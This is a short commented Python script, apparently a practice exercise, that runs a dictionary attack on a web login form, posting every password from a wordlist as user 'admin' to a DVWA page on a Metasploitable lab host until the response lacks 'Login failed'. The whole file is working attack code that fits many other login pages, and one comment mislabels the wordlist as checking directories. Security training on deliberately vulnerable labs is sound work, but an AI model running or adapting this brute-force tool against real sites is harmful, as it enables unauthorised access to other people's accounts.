#!/usr/bin/env python

# This script sends post requests to a webpage in an attempt to login to the page.
# Dictionary attacks can be used to gain access to the page using a wordlist

import requests

target_url = "http://192.168.63.131/dvwa/login.php"  # dvwa in metasploitable was used to demonstrate this attack
data_dict = {"username": "admin", "password": "", "Login": "submit"}  # after inspecting source code of the login page, created a dictionary containing those post requests details and assign them

with open("passwords.txt", "r") as wordlist_file:  # this line opens up a wordlist file that will be used to check for directories
    for line in wordlist_file:
        word = line.strip()  # strips the password file of extra characters and stores it in a word variable
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)  # this sends the post request to the login form on the browser and attempts to login using the password files
        if "Login failed" not in response.text:
            print("[+] Password found, the correct password is: " + word)  # once the password has been found, a message is being printed out
            exit()

print("[+] Searched till end of the file, password is not in wordlist.")  # this will run if all the passwords have been matched against the login page and not found

